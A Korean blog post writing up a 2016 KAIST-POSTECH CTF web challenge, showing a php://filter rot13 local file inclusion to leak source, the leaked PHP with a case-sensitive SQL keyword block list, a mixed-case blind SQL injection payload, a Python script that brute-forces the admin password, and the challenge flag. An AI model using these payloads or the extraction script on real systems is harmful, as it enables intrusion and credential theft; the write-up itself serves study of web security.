---
layout: post
title: 2016 Kaist - Postech Science War Writeup (wargame_easy | Web 200pt)
category: Hacking
date: "2016-09-24"
---

처음으로 쓰는 Writeup이다!

Web계열의 200점(확실하지 않음)짜리 문제인 [wargame_easy](http://chall.pwn-with.me)이다.

![](/images/2016_09/kapo16/main1.png)

링크를 타고 들어가면, 환영 문구와 함께 'Login' 'Register' 두 개의 메뉴가 보인다.  
Register 메뉴를 통해 사이트에 가입한 후 로그인하면 다음과 같은 화면이 나온다.

![](/images/2016_09/kapo16/main2.png)

<!-- more -->

Prob, Auth, Rank 등의 메뉴로 미루어 보건데 CTF사이트를 모티브로 만들어진 사이트이다.  
실제로 Prob에 적혀있는 키를 Auth에 넣어 보니 점수가 올라가 Rank에 반영되는 것을 확인할 수 있었다.

rank 메뉴에 진입했을 때의 URL이 `http://chall.pwn-with.me/?page=rank`이므로, LFI 취약점이 존재할 것으로 생각된다.  
이를 이용해서 php filer로 base64 인코딩된 소스를 얻으려 했으나, 소스 보기를 했을 경우 detected라는 문구밖에 보이지 않는다. page 뒤의 argument에 특정 단어가 삽임되었을 경우 이를 필터랑하고 detected를 출력하도록 프로그램되었을 것을 예상할 수 있다.

다른 php filter를 이용한 시도 결과, `php://filter/read=string.rot13/resource=`가 filtering에 걸리지 않음을 확인할 수 있었고, 이를 통해 login, register, rank, info 페이지의 소스를 13칸 밀린 caesar cipher의 형태로 알아낼 수 있었다.  
이를 복호화한 결과는 다음과 같다. (당시 toUpper 함수를 사용하여, 모든 소스가 대문자로 이루어져 있다)

<p align="CENTER">
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainIndex.php">index.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainLogin.php">login.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainInfo.php">info.php</a>
</p>

먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.

```php
<?PHP
  IF($_POST){
    IF($_SESSION[ID] == 'ADMIN') EXIT();
    IF($_POST[PW] == ""){
      ECHO "<SCRIPT>ALERT('INPUT YOUR PASSWORD.');HISTORY.GO(-1);</SCRIPT>";
      EXIT();
    }
    IF(STRLEN($_POST[PW]) > 32){
      ECHO "<SCRIPT>ALERT('CAN'T CREATE PASSWORD BIGGER THAN 32 BYTES.');HISTORY.GO(-1);</SCRIPT>";
      EXIT();
    }
    $_POST[PW] = ADDSLASHES($_POST[PW]);
    $SQL = "UPDATE MEMBER SET PW = '$_POST[PW]' WHERE ID = '$_SESSION[ID]'";
    $Q = @MYSQL_QUERY($SQL);
    ECHO "<SCRIPT>ALERT('PW CHANGED.');LOCATION.HREF='?PAGE=INFO';</SCRIPT>";
  }
?>
```

info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인데, 세 번째 줄의 `IF($_SESSION[ID] == 'ADMIN') EXIT();`에 의해 서버에 admin이 등록되어 있으며, admin 계정의 비밀번호 변경을 막고 있음을 알 수 있다. 따라서 admin계정의 비밀번호를 알아내는 것을 목표로 정하고 다음 과정을 진행하였다.

다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.

```php
<?PHP
	IF($_POST){
		IF($_SESSION[ID]){
			ECHO "<SCRIPT>ALERT('YOU HAVE ALREADY LOGGED IN.');HISTORY.GO(-1);</SCRIPT>";
			EXIT();
		}
		$SQL = "SELECT * FROM MEMBER WHERE ID = '".TRIM($_POST[ID])."'";
		$RESULT = @MYSQL_QUERY($SQL);
		$DATA = @MYSQL_FETCH_ARRAY($RESULT);
		IF($DATA[ID]){
			IF($_POST[PW] == $DATA[PW]){
				$_SESSION[ID] = $DATA[ID];
				ECHO "<SCRIPT>ALERT('HELLO $_SESSION[ID]');LOCATION.HREF='./';</SCRIPT>";
			}ELSE{
				ECHO "<SCRIPT>HISTORY.GO(-1);</SCRIPT>";
				EXIT();
			}
		}ELSE{
			ECHO "<SCRIPT>HISTORY.GO(-1);</SCRIPT>";
			EXIT();
		}
	}
?>
```

공격 방식으로 SQL Injection이 유효함을 (매우 쉽게) 알 수 있다.

이제 index 페이지의 75 ~ 80번 라인을 보면,

```php
<?PHP
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|>|<|,|\*|!|\.\./",IMPLODE($_GET))) EXIT("DETECTED");
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|>|<|,|\*|!|\.\./",IMPLODE($_POST))) EXIT("DETECTED");
	IF(ISSET($_GET[PAGE])){
		INCLUDE($_GET[PAGE].".PHP");
	}ELSE{
?>
```

base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 수 있다. 처음 LFI를 시도할 때, base64 filter가 detected된 것도 이 코드에 의해서임을 파악할 수 있었다.

처음에는 Time-based Blind SQL Injecton으로 공격을 시도하려 했으나, `sleep`, `bench`등의 중요한 함수들이 필터링되고, 결정적으로 괄호 `(`, `)`들이 필터링되어 불가능하다고 판단되었다. 괄호가 막혔기 때문에 목록에 없는 함수를 사용하는 것도 거의 불가능했다.

그러나 곧 위 코드의 치명적인 취약점을 찾아낼 수 있었는데, 그것은 `preg_match`함수의 첫 번째 argument string 뒤에 `i`가 붙지 않았다는 것이었다. 이는 preg_match에서 대소문자를 구별하여 받아들인다는 것을 뜻하고, SQL은 구문의 대소문자를 구별하지 않으므로, 이를 이용하여 필터링을 아주 간단하게 우회할 수 있었다. 예를 들어 `like`를 SQL 구문에 포함시키고 싶다면, `like` 대신 `LikE`라고 쓰면 필터링을 우회하여 서버에 그대로 구문을 보낼 수 있게 된다.

이에 착안하여 다음과 같은 payload를 만들 수 있었다.

`fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a`

이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.

```sql
SELECT * FROM MEMBER WHERE ID = 'fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a
```

괄호가 필터링됨으로 인해 if, substr등의 함수를 사용할 수 없었으므로, 그 대신에 case when과 like를 활용하여 비슷한 역할을 하는 구문을 만들 수 있었다.

ID로 들어가는 `fqwrlqwrhqwklhflqfi123123`은 서버에 등록되어 있지 않은 id이므로, 언제나 거짓을 반환한다. 그 후 `CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END`를 만나게 되는데, 만약 admin의 pw가 a로 시작한다면 TRUE를, 아니라면 FALSE를 반환한다. 만약 FALSE라면, 뒤의 구문에 의해 `godj3`을 id로서 불러오게 되고, pw부분에 미리 만들어 둔 godj3 계정의 비밀번호를 입력해 두면 godj3계정으로 로그인된다. 만약 admin의 pw가 a로 시작한다면, 미리 입력해 둔 godj3 계정의 비밀번호와 admin의 비밀번호는 맞지 않을 것이므로 로그인에 실패하게 된다. 이를 이용하여 admin의 password를 알아내는 프로그램을 짤 수 있다.

<p align="CENTER">
	<a href="https://github.com/GAONNR/Kapo2016/blob/master/login.py">login.py</a>
</p>

```python
import requests
import string

baseurl = 'http://chall.pwn-with.me/?page=login'

def postData(id, pw):
    params = {'id': id, 'pw': pw}
    res = requests.post(baseurl, data = params)

    #print res.text
    if res.text.find('Hello') > 0:
        return True
    else:
        return False


# print postData('''fqwrlqwrhqwklhflqf' or if(id='admin' and 0, 1, 0) or name='guest' order by name asc -- a''', 'guest')

print postData("fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND FALSE THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a", 'godj3')

print postData('godj3', 'godj3')

print postData("sadawqoeqweqnnncxma' or id='godj3' -- a", 'godj3')

payload = "fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE '"

payend = "%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a"

key = ''

for k in range(100):
    check = False
    for i in string.printable:
        if i == '_' or i == '!' or i == '#' or i == '%' or i == '\'' or i == '\"' or i == '(' or i == ')' or i == '*' or i == '+' or i == '-' or i == '&' or i == '|' or i == '>' or i == '<' or i == '=' or i == '?' or i == '~' or i == ',':
            continue
        # print key + i,
        # print postData(payload + i + payend, 'godj3')
        if not postData(payload + key + i + payend, 'godj3'):
            print key + i
            key = key + i
            check = True
            break

    if check == False:
        key += '_'
```

flag: `kapo{j.s.bach_french_suites}`
